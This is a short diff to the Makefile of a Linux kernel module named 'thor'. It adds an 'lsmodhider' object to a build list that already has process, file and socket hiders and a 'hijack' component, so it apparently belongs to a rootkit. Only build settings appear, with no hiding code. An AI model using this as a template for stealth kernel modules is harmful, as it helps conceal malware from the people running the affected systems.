@@ -1,5 +1,5 @@
 obj-m += thor.o
-thor-objs := main.o helper.o procfile.o prochider.o filehider.o sockethider.o hijack.o
+thor-objs := main.o helper.o procfile.o prochider.o filehider.o lsmodhider.o sockethider.o hijack.o
 
 KDIR  := /lib/modules/$(shell uname -r)/build
 PWD   := $(shell pwd)
